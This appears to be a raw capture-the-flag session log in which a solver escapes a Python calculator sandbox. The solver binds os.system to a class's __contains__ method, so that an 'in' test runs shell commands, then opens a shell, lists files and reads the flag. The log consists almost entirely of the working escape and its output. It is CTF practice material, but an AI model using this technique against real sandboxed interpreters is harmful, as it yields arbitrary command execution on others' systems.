> tease
<built-in function system>
> s = _
> math.__class__
<class '__main__.Math'>
> c = _
> c.__contains__ = s
> math
{}
> m = _
> "id" in m
uid=501(kristian) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),501(access_bpf),702(com.apple.sharepoint.group.2),703(com.apple.sharepoint.group.3),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae),701(com.apple.sharepoint.group.1)
False
> "sh" in m
id
uid=1000(kalk) gid=1000(kalk) groups=1000(kalk)
ls -la
total 40
drwxr-xr-x 1 root root  4096 Oct  4 18:19 .
drwxr-xr-x 1 root root  4096 Oct  4 18:20 ..
-rw-r--r-- 1 root root     9 Oct  4 18:06 flag.txt
-rw-r--r-- 1 root root   876 Oct  4 18:18 kalk.py
-rwxr-xr-x 1 root root 18744 Oct  4 18:02 ynetd
cat flag.txt
EPT{y0u_br0k3_my_c4lcu1at0r!}
False
